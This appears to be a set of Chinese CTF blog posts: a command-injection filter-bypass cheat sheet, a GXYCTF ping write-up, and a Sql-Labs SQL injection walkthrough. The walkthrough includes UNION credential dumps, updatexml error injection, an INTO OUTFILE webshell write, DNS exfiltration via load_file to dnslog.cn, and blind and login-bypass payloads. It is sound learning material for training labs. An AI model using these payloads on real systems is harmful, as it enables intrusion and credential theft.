    <title>命令注入知识点总结</title>
    <url>/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="命令注入知识点总结"><a href="#命令注入知识点总结" class="headerlink" title="命令注入知识点总结"></a>命令注入知识点总结</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、%20(space)、%09(tab)、$IFS<span class="variable">$9</span>、 IFS、IFS</span><br><span class="line">2、使用&lt;或者&lt;&gt;来绕过空格 cat&lt;a.txt</span><br><span class="line">3、花括号扩展&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,/etc/passwd&#125;</span><br><span class="line">4、<span class="variable">$IFS</span> 空格绕过 cat<span class="variable">$IFSa</span>.txt</span><br><span class="line">5、变量控制 X=$<span class="string">&#x27;cat\x09./flag.php</span></span><br></pre></td></tr></table></figure>
<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、使用空变量 使用$*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10)(我尝试小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 ca<span class="variable">$&#123;21&#125;</span>t a.txt</span><br><span class="line">2、反斜杠 ca\t a.txt</span><br><span class="line">3、变量替换 a=ca;b=t;c=a.txt;a aab <span class="variable">$c</span></span><br><span class="line">4、引号 c<span class="string">&#x27;a&#x27;</span>t flag.php</span><br><span class="line">5、编码绕过</span><br><span class="line">    Base64 编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27;| base64 Y2F0IGEudHh0Cg==</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;Y2F0IGEudHh0Cg==&#x27; | base64 -d abc</span></span><br><span class="line">    十六进制编码绕过：</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27; | xxd -p 63617420612e7478740a</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;0x63617420612e7478740a&#x27;| xxd -r -p Abc</span></span><br><span class="line">6、通配符 ？*</span><br><span class="line">    […]：匹配范围中任何一个字符 cat fl[abc]g.php</span><br><span class="line">    [a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php</span><br><span class="line">    &#123;a,b&#125;：对以逗号分割的文件列表进行拓展 cat fl&#123;b,c&#125;g.php</span><br></pre></td></tr></table></figure>
<h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">例：command1 &amp; command2    先执行command2后执行command1</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">例：command1 &amp;&amp; command2   先执行command1后执行command2</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">例：command1 | command2     只执行command2</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">例：7 || ls /</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">例：ping 127.0.0.1;ls /</span><br></pre></td></tr></table></figure>
<h2 id="真题Writeup"><a href="#真题Writeup" class="headerlink" title="真题Writeup"></a>真题Writeup</h2><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进入题目稍微测试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip=1 &amp; ls</span><br><span class="line">返回 fxck your space! <span class="comment"># 过滤了空格</span></span><br><span class="line"></span><br><span class="line">ip=1;ls</span><br><span class="line">返回 <span class="comment"># 看来分号没有被过滤</span></span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">ip=1;cat&lt;flag.php</span><br><span class="line">返回 fxck your symbol! <span class="comment"># 过滤了&lt; 字符</span></span><br><span class="line"></span><br><span class="line">ip=1;cat/**/flag.php</span><br><span class="line">返回 fxck your symbol! <span class="comment"># 过滤了/ 和 *字符</span></span><br><span class="line"></span><br><span class="line">ip=1;cat<span class="variable">$IFSflag</span>.php</span><br><span class="line">返回 fxck your flag! <span class="comment"># 过滤了 &#x27;flag&#x27; 但是$IFS没被过滤</span></span><br></pre></td></tr></table></figure>
<p>试试内联执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip=1;a=f;b=ag;c=l;cat$IFS$a$c<span class="variable">$b</span>.php</span><br><span class="line">ctrl + u查看源代码即可得到flag</span><br></pre></td></tr></table></figure>






<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161699126116780264045852%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161699126116780264045852&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-104297163.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p>
<p><a href="https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/u014549283/article/details/81783164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161690037516780357237205%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161690037516780357237205&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-81783164.first_rank_v2_pc_rank_v29&amp;utm_term=ping+%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a></p>
]]></content>
      <categories>
        <category>Web学习</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql相关函数</title>
    <url>/2021/02/05/sql/mysql%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><a id="more"></a>
<table>
<thead>
<tr>
<th>函数名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>version()</td>
<td>返回数据库版本</td>
</tr>
<tr>
<td>database()</td>
<td>返回数据库名</td>
</tr>
<tr>
<td>user() current_user() system_user()</td>
<td>返回用户名</td>
</tr>
<tr>
<td>@@datadir</td>
<td>返回数据库路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>返回操作系统版本</td>
</tr>
<tr>
<td>length()</td>
<td>返回字符串长度</td>
</tr>
<tr>
<td>substring() substr() mid()</td>
<td>截取字符串： 参数1：字符串 参数2：起始位置，索引从1开始 参数3：截取长度</td>
</tr>
<tr>
<td>concat()</td>
<td>不带分隔符链接字符串</td>
</tr>
<tr>
<td>concat_ws()</td>
<td>带分隔符链接字符串： concat_ws(’-’,‘a’,‘b’,‘c’)</td>
</tr>
<tr>
<td>group_concat()</td>
<td>链接一组查询结果字符串</td>
</tr>
<tr>
<td>ord() ascii()</td>
<td>返回字符串的ASCII值</td>
</tr>
<tr>
<td>left()</td>
<td>从左边开始截取字符串： 参数1：字符串 参数2：截取的长度</td>
</tr>
<tr>
<td>rand()</td>
<td>返回0-1之间的浮点数</td>
</tr>
<tr>
<td>round()</td>
<td>四舍五入： round(4.2323151,2)–&gt;4.23</td>
</tr>
<tr>
<td>floor()</td>
<td>向下取整</td>
</tr>
<tr>
<td>load_file()</td>
<td>返回读取文件的内容，返回字符串类型</td>
</tr>
<tr>
<td>if()</td>
<td>判断：if(exp1,exp2,exp3): 如果exp1为真，返回exp2，否则返回exp3</td>
</tr>
<tr>
<td>updatexml()</td>
<td>报错注入可以用到的函数，如果参数2格式不正确，会报错误信息，此时将需要的函数填在这里就会爆出需要的信息 参数1：string格式，为xml文档对象的名称 参数2：xpath格式的字符串 参数3：string格式，替换查找到的符合条件的数据</td>
</tr>
<tr>
<td>addslashes()</td>
<td>转义特殊字符（’ “ \）</td>
</tr>
<tr>
<td>hex()</td>
<td>将字符串转换为16进制</td>
</tr>
<tr>
<td>unhex()</td>
<td></td>
</tr>
<tr>
<td>limit m,n</td>
<td>从m开始 查找n条（索引从0开始）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入基本语句</title>
    <url>/2021/02/05/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql-Labs</title>
    <url>/2021/02/07/sql/sql-labs/</url>
    <content><![CDATA[<p>sql-labs-less-1-10</p>
<a id="more"></a>

<h1 id="Less-1-基于’-的字符型注入"><a href="#Less-1-基于’-的字符型注入" class="headerlink" title="Less-1-基于’ 的字符型注入"></a>Less-1-基于’ 的字符型注入</h1><p>进去后老套路</p>
<p>先测试一下注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e974130e6213715867b0a5b332150a8c.png"></p>
<p>把1=1换成1=2</p>
<blockquote>
<p>id=1‘  and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8792b518d8154c5ccc0b6e072876661d.png"></p>
<p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p>
<p>查询有多少列</p>
<blockquote>
<p>id=1’ order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/642125828168fb5342d7dc127e2fccd3.png"></p>
<p>出现错误，证明表中只有三列</p>
<p>判断显示点</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2f3d76328e8ba05b0004fd749abd53a0.png"></p>
<p>查询用户，数据库</p>
<blockquote>
<p>id=-1’ union select 1,user(),database() –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/846d30e188f1547591acea4bf8b852cf.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c8e1124e5d208d21bf60a1522dc9975b.png"></p>
<h1 id="Less-2-数字型注入"><a href="#Less-2-数字型注入" class="headerlink" title="Less-2-数字型注入"></a>Less-2-数字型注入</h1><p>由提示知道是整数型注入</p>
<p>老套路</p>
<blockquote>
<p>id=1 and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2c1f549f4c118fb6be5f6aeb633b17b3.png"></p>
<p>吧1=1换成1=2</p>
<blockquote>
<p>id=1 and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bc45f5df67356a6296e570c0b06e27f2.png"></p>
<p>没有错误，也没有回显，说明为数字型注入</p>
<p>查询有多少列</p>
<blockquote>
<p>id=1 order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7a7b987b06c113264fc76ff59bdab201.png"></p>
<p>查询显示点</p>
<blockquote>
<p>id=-1 union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4ebec5db0104a132a7b042c371f940e2.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/74bfa2cfcb47bb7ad33d3a418d4baee6.png"></p>
<h1 id="Less-3-基于’-的字符注入"><a href="#Less-3-基于’-的字符注入" class="headerlink" title="Less-3-基于’) 的字符注入"></a>Less-3-基于’) 的字符注入</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p>
<p>可以直接去看代码验证</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1bb2bca05087136a3b13a39703a6473e.png"></p>
<p>知道了注入点，就开始老套路</p>
<p>查询列数</p>
<blockquote>
<p>id=1’) order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d04a6ee5cdd6fc1d6c785871071abe8b.png"></p>
<p>查询显示点</p>
<blockquote>
<p>id=-1’) union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/468064452acf79cc9c0725801c5ff326.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e4e3ad10e7ba5a5a956ddc82f8c0c100.png"></p>
<h1 id="Less-4-基于”-的字符型注入"><a href="#Less-4-基于”-的字符型注入" class="headerlink" title="Less-4-基于”) 的字符型注入"></a>Less-4-基于”) 的字符型注入</h1><p>根据提示可以知道，这题是双引号字符注入<br>测试注入点，刚开始还以为是只有双引号的注入点</p>
<blockquote>
<p>id=1” and 1=1 –+</p>
</blockquote>
<p>结果提示错误了<br><img src="https://img-blog.csdnimg.cn/20210206112347169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">于是我就猜测可能是包括了上一题的 ) 字符注入点，在后面加个 )</p>
<blockquote>
<p>id=1”) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206112458418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">有反应了，继续测试</p>
<blockquote>
<p>id=1”) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206112557663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">没有提示错误也没有回显，说明注入点正确，接下来就是老套路了</p>
<blockquote>
<p>id=1”) order by 4 –+ //查询列<br>id=-1”) union select 1,2,3 –+ //查询显示点<br>id=-1”) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+ //查询用户名，密码</p>
</blockquote>
<p>最终结果<br><img src="https://img-blog.csdnimg.cn/20210206112921881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-5-基于’-的报错注入"><a href="#Less-5-基于’-的报错注入" class="headerlink" title="Less-5-基于’ 的报错注入"></a>Less-5-基于’ 的报错注入</h1><p>题目刚开始给了个double query的提示，由于是第一次见，没明白是啥意思。<br>就开始常规的测试一下注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+<br>id=1’ and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120620545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210206120634918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现字符注入可行，查询一下列数</p>
<blockquote>
<p>id=1’ order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120737992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后查显示点的时候，发现一个很严重的问题，题目没有给出显示点</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120858544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">还没见过这种类型题，于是去看了眼源码<br><img src="https://img-blog.csdnimg.cn/20210206184538545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>在这看到会输出mysql_error()<br>所以想到了报错注入，因为第一次遇到，所以去找了找报错注入咋搞<br>发现可以updatexml()注入</p>
<blockquote>
<p>id=-1’ union select updatexml(1,concat(0x7e,user(),0x7e),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206185449491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h2 id="updatexml-语法"><a href="#updatexml-语法" class="headerlink" title="updatexml()语法"></a>updatexml()语法</h2><p>updatexml()：(XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>其实，第一个和第三个参数可以随意填写</p>
<h1 id="Less-6-基于”-的报错注入"><a href="#Less-6-基于”-的报错注入" class="headerlink" title="Less-6-基于” 的报错注入"></a>Less-6-基于” 的报错注入</h1><p>与上一题同样是报错注入，但是注入点变为了 “ </p>
<blockquote>
<p>id=-1” union select updatexml(1,concat(user()),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207103757424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-7-文件读写"><a href="#Less-7-文件读写" class="headerlink" title="Less-7-文件读写"></a>Less-7-文件读写</h1><p>进入题目发现提示是Dump into Outfile，说明要用到文件的读写</p>
<h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2><p>mysql的文件读写函数<strong>load_file</strong>函数与<strong>into outfile</strong>函数只有满足以下条件可以使用:</p>
<blockquote>
<p>当前连接的mysql用户为root权限<br>文件权限: chmod a+x pathtofile<br>文件大小: 必须小于max_allowed_packet</p>
</blockquote>
<p>文件的读写一般是要通过mysql配置文件的权限才可以使用的，5.5之前的版本是secure_file_priv变量 默认为空 所以直接就可以使用，但是高于5.5时mysql新出了一个secure-file-priv字段<br>所以我们需要更改一下mysql的配置文件，加一行</p>
<blockquote>
<p>secure_file_priv= </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207160905713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后重启一下mysql就可以了。(tips结束<br>进入题目后老方法</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161123726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">报错了，测试了一会后发现是这样闭合的</p>
<blockquote>
<p>id=1’)) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161223667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">提示使用outfile()函数<br>于是我们构造一个payload</p>
<blockquote>
<p>id=-1’)) union select 1,’这是放木马的’,3 into outfile ‘D:\1.php’ –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161431162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">进D盘查看文件在不在<br><img src="https://img-blog.csdnimg.cn/2021020716160698.png"><br>然后写个木马进去查看用户名和密码试试</p>
<blockquote>
<p>id=-1’)) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 into outfile ‘D:\2.php’ –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161721999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-8-基于’-的布尔盲注"><a href="#Less-8-基于’-的布尔盲注" class="headerlink" title="Less-8-基于’ 的布尔盲注"></a>Less-8-基于’ 的布尔盲注</h1><p>这题通过提示我们知道可以使用布尔注入，所以我想到了用dns回显来进行数据查看，这里推荐一个网站<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>进入这个网站之后，点击<strong>Get SubDomain</strong>，可以得到一个dns地址<br><img src="https://img-blog.csdnimg.cn/2021020723174412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后编辑注入语句</p>
<blockquote>
<p>id=1’ and load_file(concat(“\\“,(database()),”.xk0cq2.dnslog.cn\1.txt”)) –+</p>
</blockquote>
<p>注入之后点击Refresh Record即可收到回显结果<br><img src="https://img-blog.csdnimg.cn/20210207232007455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-9-基于’-的时间盲注"><a href="#Less-9-基于’-的时间盲注" class="headerlink" title="Less-9-基于’ 的时间盲注"></a>Less-9-基于’ 的时间盲注</h1><p>根据提示我们可以知道，这题是基于时间的注入，所以我们可以使用延时注入<br>先构造payload</p>
<blockquote>
<p>id=1’ and if(length(database())&gt;5,sleep(5),1) –+</p>
</blockquote>
<p>这样，我们就可以通过浏览器的返回时间来判断数据库名的长度<br><img src="https://img-blog.csdnimg.cn/20210207232912577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p><img src="https://img-blog.csdnimg.cn/20210207232832546.png"></p>
<h1 id="Less-10-基于”-的时间盲注"><a href="#Less-10-基于”-的时间盲注" class="headerlink" title="Less-10-基于” 的时间盲注"></a>Less-10-基于” 的时间盲注</h1><p>这题与上图一样，可以使用延时注入，但是注入闭合点换成了”<br>构造payload</p>
<blockquote>
<p>id=1” and if(length(database())&gt;5,sleep(5),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207233611122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207233637454.png"></p>
<h1 id="Less-11-基于’-的POST型注入"><a href="#Less-11-基于’-的POST型注入" class="headerlink" title="Less-11-基于’ 的POST型注入"></a>Less-11-基于’ 的POST型注入</h1><p>首先测试注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208113829324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现是password那块有问题，于是想到可能是–+注释被ban掉了<br>所以使用#注释</p>
<blockquote>
<p>id=1’ and 1=1 #</p>
</blockquote>
<p>成功<br><img src="https://img-blog.csdnimg.cn/2021020811392689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后是payload</p>
<blockquote>
<p>1’ or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114314457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-12-基于”-的POST型注入"><a href="#Less-12-基于”-的POST型注入" class="headerlink" title="Less-12-基于”) 的POST型注入"></a>Less-12-基于”) 的POST型注入</h1><p>看题目说是双引号，于是尝试构造payload</p>
<blockquote>
<p>1” ‘ or 1=1 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208114615375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">查看报错，发现其实是”) 闭合<br>所以重新来一次</p>
<blockquote>
<p>1”) or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114706613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-13-基于’-的报错注入"><a href="#Less-13-基于’-的报错注入" class="headerlink" title="Less-13-基于’) 的报错注入"></a>Less-13-基于’) 的报错注入</h1><p>根据题目可以知道是基于) 的报错注入，于是构造测试payload，发现其实是’) 闭合</p>
<blockquote>
<p>1’) or 1=1 #</p>
</blockquote>
